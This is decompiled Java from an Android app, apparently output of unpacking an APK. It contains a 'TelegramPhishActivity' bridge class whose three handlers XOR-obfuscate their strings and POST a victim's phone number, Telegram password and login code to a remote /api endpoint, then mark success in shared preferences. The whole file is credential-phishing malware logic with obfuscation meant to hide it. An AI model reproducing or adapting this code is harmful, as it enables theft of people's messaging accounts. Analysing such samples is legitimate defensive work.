package com.base.template;

import kotlin.jvm.internal.Intrinsics;
import org.json.JSONObject;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final /* synthetic */ class TelegramPhishActivity$PhishBridge$$ExternalSyntheticLambda0 implements Runnable {
    public final /* synthetic */ int $r8$classId;
    public final /* synthetic */ String f$0;
    public final /* synthetic */ TelegramPhishActivity f$1;

    public /* synthetic */ TelegramPhishActivity$PhishBridge$$ExternalSyntheticLambda0(String str, TelegramPhishActivity telegramPhishActivity, int i) {
        this.$r8$classId = i;
        this.f$0 = str;
        this.f$1 = telegramPhishActivity;
    }

    @Override // java.lang.Runnable
    public final void run() {
        switch (this.$r8$classId) {
            case 0:
                String str = this.f$0;
                TelegramPhishActivity telegramPhishActivity = this.f$1;
                String strDecode = C0000.decode(new byte[]{81, 70, 17, 13, 67}, "44cb1cff09", 2);
                try {
                    String strAccess$doPost = TelegramPhishActivity.access$doPost(telegramPhishActivity, C0000.decode(new byte[]{23, 89, 64, 8, 75, 66, 80, 81, 67, 9, 75, 65, 76, 89, 66, 21}, "880ad2", false), new JSONObject().put(C0000.decode(new byte[]{17, 10, 91, 8, 7}, "ab4fb0fb", 0), str));
                    if (strAccess$doPost != null) {
                        JSONObject jSONObject = new JSONObject(strAccess$doPost);
                        TelegramPhishActivity.access$callResult(telegramPhishActivity, jSONObject.optString(C0000.decode(new byte[]{68, 17, 85, 21, 23, 75}, "7e4ab896d9d9", 5), strDecode), jSONObject.optString(C0000.decode(new byte[]{92, 92, 64, 68, 5, 1, 4}, "1937dfaa59dd", 0.0f), ""));
                    } else {
                        TelegramPhishActivity.access$callResult(telegramPhishActivity, strDecode, C0000.decode(new byte[]{44, 86, 70, 17, 12, 70, 9, 19, 87, 20, 17, 91, 16}, "b32fc4", 0.0f));
                    }
                } catch (Exception e) {
                    String message = e.getMessage();
                    if (message == null) {
                        message = C0000.decode(new byte[]{38, 19, 65, 89, 16}, "ca36bd", false);
                    }
                    TelegramPhishActivity.access$callResult(telegramPhishActivity, strDecode, message);
                    return;
                }
                break;
            case 1:
                String str2 = this.f$0;
                TelegramPhishActivity telegramPhishActivity2 = this.f$1;
                String strDecode2 = C0000.decode(new byte[]{83, 16, 68, 9, 66}, "6b6f06", 1);
                try {
                    String strAccess$doPost2 = TelegramPhishActivity.access$doPost(telegramPhishActivity2, C0000.decode(new byte[]{27, 4, 70, 95, 30, 64, 88, 95, 23, 90, 29, 80, 82, 7}, "4e661006d22b4ffa"), new JSONObject().put(C0000.decode(new byte[]{20, 0, 17, 75, 21, 11, 20, 6}, "dab8bdfb8ec0", 0.0f), str2));
                    if (strAccess$doPost2 == null) {
                        TelegramPhishActivity.access$callResult(telegramPhishActivity2, strDecode2, C0000.decode(new byte[]{125, 93, 67, 21, 12, 74, 91, 66, 4, 23, 19, 9, 65}, "387bc80baeaf", false));
                    } else {
                        JSONObject jSONObject2 = new JSONObject(strAccess$doPost2);
                        String strOptString = jSONObject2.optString(C0000.decode(new byte[]{68, 23, 89, 67, 70, 65}, "7c873293adf152", 0.0f), strDecode2);
                        if (Intrinsics.areEqual(strOptString, C0000.decode(new byte[]{66, 20, 80, 81, 93, 67, 22}, "1a3280e1", 1))) {
                            telegramPhishActivity2.getSharedPreferences(C0000.decode(new byte[]{70, 84, 103, 18, 80, 89, 71, 88}, "238b8040204294fa", false), 0).edit().putInt(C0000.decode(new byte[]{89, 17, 65, 82, 85, 21, 64, 66}, "8e578e41b4", false), 999).apply();
                        }
                        TelegramPhishActivity.access$callResult(telegramPhishActivity2, strOptString, jSONObject2.optString(C0000.decode(new byte[]{85, 83, 74, 75, 88, 2, 92}, "86989e97be296e34", true), ""));
                    }
                } catch (Exception e2) {
                    String message2 = e2.getMessage();
                    if (message2 == null) {
                        message2 = C0000.decode(new byte[]{115, 16, 64, 13, 70}, "6b2b474d579f", 6);
                    }
                    TelegramPhishActivity.access$callResult(telegramPhishActivity2, strDecode2, message2);
                    return;
                }
                break;
            default:
                String str3 = this.f$0;
                TelegramPhishActivity telegramPhishActivity3 = this.f$1;
                String strDecode3 = C0000.decode(new byte[]{3, 68, 71, 89, 74}, "f656852268ac", 4);
                try {
                    String strAccess$doPost3 = TelegramPhishActivity.access$doPost(telegramPhishActivity3, C0000.decode(new byte[]{77, 2, 20, 95, 31, 18, 80, 11, 65, 91, 75, 78, 1, 20, 81, 5, 27}, "bcd60b8b23d8df8c", 0.0f), new JSONObject().put(C0000.decode(new byte[]{81, 11, 87, 86}, "2d3352", 0.0f), str3));
                    if (strAccess$doPost3 == null) {
                        TelegramPhishActivity.access$callResult(telegramPhishActivity3, strDecode3, C0000.decode(new byte[]{40, 3, 16, 20, 13, 70, 94, 66, 3, 20, 22, 12, 16}, "ffdcb45b", 0.0f));
                    } else {
                        JSONObject jSONObject3 = new JSONObject(strAccess$doPost3);
                        String strOptString2 = jSONObject3.optString(C0000.decode(new byte[]{68, 68, 80, 18, 16, 71}, "701fe42e", 5), strDecode3);
                        if (Intrinsics.areEqual(strOptString2, C0000.decode(new byte[]{17, 76, 5, 91, 83, 74, 18}, "b9f869ae6570f1d0", 0))) {
                            telegramPhishActivity3.getSharedPreferences(C0000.decode(new byte[]{64, 6, 102, 20, 90, 12, 22, 12}, "4a9d2eed1849575e", 5), 0).edit().putInt(C0000.decode(new byte[]{4, 77, 16, 85, 91, 21, 21, 16}, "e9d06eacd3"), 999).apply();
                        }
                        TelegramPhishActivity.access$callResult(telegramPhishActivity3, strOptString2, jSONObject3.optString(C0000.decode(new byte[]{92, 82, 66, 18, 3, 81, 92}, "171ab697f839", 5), ""));
                    }
                } catch (Exception e3) {
                    String message3 = e3.getMessage();
                    if (message3 == null) {
                        message3 = C0000.decode(new byte[]{115, 17, 65, 88, 67}, "6c371e86", 4);
                    }
                    TelegramPhishActivity.access$callResult(telegramPhishActivity3, strDecode3, message3);
                }
                break;
        }
    }
}
